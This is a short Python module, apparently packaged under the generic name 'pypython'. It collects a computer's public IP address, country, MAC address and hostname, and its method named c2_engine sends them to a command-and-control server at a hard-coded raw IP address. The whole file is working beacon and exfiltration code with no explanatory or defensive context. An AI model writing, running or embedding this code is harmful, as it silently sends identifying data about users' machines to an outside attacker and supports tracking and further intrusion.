import time
import os
import sys
import requests
import socket
import uuid
import platform
import json

def get_public_ip():
    return requests.get("https://api.ipify.org").text

def get_country():
    try:
        response = requests.get("https://api.country.is")
        data = response.json()
        return data.get('country', 'Unknown')
    except Exception as e:
        return 'Unknown'

def get_mac():
    mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
                        for ele in range(0,8*6,8)][::-1])
    return mac_address

def get_computer_name():
    return platform.node()

class pypython:
    @staticmethod
    def c2_engine():
        try:
            data = {
                "public_ip": get_public_ip(),
                "computer_name": get_computer_name(),
                "mac_address": get_mac(),
                "country": get_country()
            }
            
            response = requests.post("http://165.227.81.186:5000/submit", json=data)
            if response.status_code == 200:
                return 'Success'
            else:
                return 'Failed'
        except Exception as e:
            return 'Unknown'


      


